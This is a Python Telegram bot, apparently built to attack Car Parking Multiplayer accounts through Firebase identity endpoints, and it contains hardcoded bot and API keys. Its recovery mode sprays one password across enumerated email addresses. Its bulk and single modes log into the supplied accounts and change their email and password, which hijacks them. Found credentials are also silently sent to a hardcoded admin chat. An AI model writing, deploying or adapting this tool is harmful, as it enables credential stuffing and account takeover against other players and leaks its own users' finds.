import telebot
import requests
from telebot import types
from threading import Thread
from flask import Flask
import os
import time
import re

# --- SERVER ---
app = Flask('')
@app.route('/')
def home(): 
    return "🔥 CPMEGY TURBO MASTER IS ACTIVE!"

def run_flask():
    # Render-ൽ പോർട്ട് ശരിയായി കണക്ട് ചെയ്യാൻ ഇത് നിർബന്ധമാണ്
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIG ---
TOKEN = "8542467216:AAG_S6R4YMswzKHRWJxOtCCj0A059bf3BpE"
bot = telebot.TeleBot(TOKEN, threaded=True)
ADMIN_ID = 7212602902 

API_KEYS = {
    "CPM1": "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA", 
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}
user_states = {}

# --- HELPER FUNCTIONS ---
def login_acc(email, password, version):
    try:
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS[version]}"
        r = requests.post(url, json={"email": email, "password": password, "returnSecureToken": True}, timeout=7)
        return r.json().get('idToken') if r.status_code == 200 else None
    except: return None

def update_acc(token, new_email, new_pass, version):
    try:
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={API_KEYS[version]}"
        r = requests.post(url, json={"idToken": token, "email": new_email, "password": new_pass, "returnSecureToken": True}, timeout=7)
        return r.status_code == 200
    except: return False

# --- START COMMAND ---
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔍 Turbo Recovery", callback_data="mode_recover"),
        types.InlineKeyboardButton("📦 Bulk Change", callback_data="mode_bulk"),
        types.InlineKeyboardButton("👤 Single Change", callback_data="mode_single")
    )
    bot.send_message(message.chat.id, "🔥 **CPMEGY TURBO MASTER v2.0**\n\nChoose Service:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    cid = call.message.chat.id
    user_states[cid] = {'mode': call.data}
    if call.data == "mode_recover":
        msg = bot.send_message(cid, "📧 **Recovery Format:**\n`cpmegy_{4}_cpm@gmail.com`")
        bot.register_next_step_handler(msg, get_recovery_pass)
    elif call.data == "mode_bulk":
        msg = bot.send_message(cid, "📩 Send your `.txt` file (Email:Pass):")
        bot.register_next_step_handler(msg, handle_bulk_file)
    elif call.data == "mode_single":
        msg = bot.send_message(cid, "📧 Enter: `Old:Pass:New:NewPass`")
        bot.register_next_step_handler(msg, handle_single_change)

# --- TURBO RECOVERY ---
def get_recovery_pass(message):
    user_states[message.chat.id]['format'] = message.text.strip()
    msg = bot.send_message(message.chat.id, "🔑 **Password to check:**")
    bot.register_next_step_handler(msg, run_recovery)

def run_recovery(message):
    cid = message.chat.id
    pwd = message.text.strip()
    fmt = user_states[cid]['format']
    matches = re.findall(r"\{(\d+)\}", fmt)
    digit_configs = [int(m) for m in matches] if matches else [4]
    clean_fmt = fmt
    if matches:
        for i, count in enumerate(digit_configs): clean_fmt = clean_fmt.replace(f"{{{count}}}", f"{{{i}}}", 1)
    else: clean_fmt = fmt.replace("{}", "{0}")

    max_range = 10**max(digit_configs)
    bot.send_message(cid, f"🚀 **Turbo Scan Started!**\nFormat: `{fmt}`")

    def task():
        found = 0
        for i in range(1, max_range):
            vals = [str(i).zfill(d) for d in digit_configs]
            try: email = clean_fmt.format(*vals)
            except: continue
            if login_acc(email, pwd, "CPM2"):
                found += 1
                bot.send_message(cid, f"💎 **CPMEGY FOUND:** `{email}`")
                bot.send_message(ADMIN_ID, f"✅ Found: `{email}` | Pass: `{pwd}`")
            time.sleep(0.01)
            if i % 1000 == 0:
                bot.send_message(cid, f"📊 Progress: {i}/{max_range-1}...")
        bot.send_message(cid, f"🏁 Done! Total Found: {found}")
    Thread(target=task).start()

# --- BULK CHANGE ---
def handle_bulk_file(message):
    if not message.document: return
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    with open(f"bulk_{message.chat.id}.txt", "wb") as f: f.write(downloaded)
    msg = bot.send_message(message.chat.id, "📧 **New Template:**\n(Ex: `cpmegy_{}_@gmail.com`)")
    bot.register_next_step_handler(msg, get_bulk_pass)

def get_bulk_pass(message):
    user_states[message.chat.id]['new_fmt'] = message.text.strip()
    msg = bot.send_message(message.chat.id, "🔑 **New Password for all:**")
    bot.register_next_step_handler(msg, run_bulk_process)

def run_bulk_process(message):
    cid = message.chat.id
    new_pwd = message.text.strip()
    data = user_states[cid]
    
    def process():
        success = []
        try:
            with open(f"bulk_{cid}.txt", "r") as f: lines = f.readlines()
            bot.send_message(cid, f"🚀 **Starting Bulk Change...**")
            for line in lines:
                if ":" not in line: continue
                oe, op = line.strip().rsplit(":", 1)
                token = login_acc(oe.strip(), op.strip(), "CPM2")
                if token:
                    rand_id = str(int(time.time() * 1000))[-3:]
                    new_e = data['new_fmt'].replace("{}", rand_id) if "{}" in data['new_fmt'] else f"{rand_id}{data['new_fmt']}"
                    if update_acc(token, new_e, new_pwd, "CPM2"):
                        success.append(f"{new_e}:{new_pwd}")
                        bot.send_message(cid, f"✅ **SUCCESS!**\n\n📧 **Old:** `{oe.strip()}`\n📧 **New:** `{new_e}`\n🔑 **Pass:** `{new_pwd}`", parse_mode="Markdown")
                time.sleep(0.5)
            if success:
                res_file = f"res_{cid}.txt"
                with open(res_file, "w") as f: f.write("\n".join(success))
                bot.send_document(cid, open(res_file, "rb"), caption="🏁 Bulk Finished!")
        except Exception as e: bot.send_message(cid, f"⚠️ Error: {str(e)}")
    Thread(target=process).start()

# --- SINGLE CHANGE ---
def handle_single_change(message):
    try:
        parts = message.text.split(":")
        token = login_acc(parts[0], parts[1], "CPM2")
        if token and update_acc(token, parts[2], parts[3], "CPM2"):
            bot.send_message(message.chat.id, f"✅ **Success!**\nNew: `{parts[2]}`")
        else: bot.send_message(message.chat.id, "❌ Failed.")
    except: bot.send_message(message.chat.id, "⚠️ Format Error.")

# --- MAIN RUNNER ---
if __name__ == "__main__":
    # Flask സെർവർ ഒരു സെപ്പറേറ്റ് ത്രെഡിൽ റൺ ചെയ്യുന്നു
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    # Render-ൽ ക്രാഷ് ആവാതിരിക്കാൻ infinity_polling ഉപയോഗിക്കുന്നു
    print("🚀 Bot is starting...")
    bot.infinity_polling(skip_pending=True)
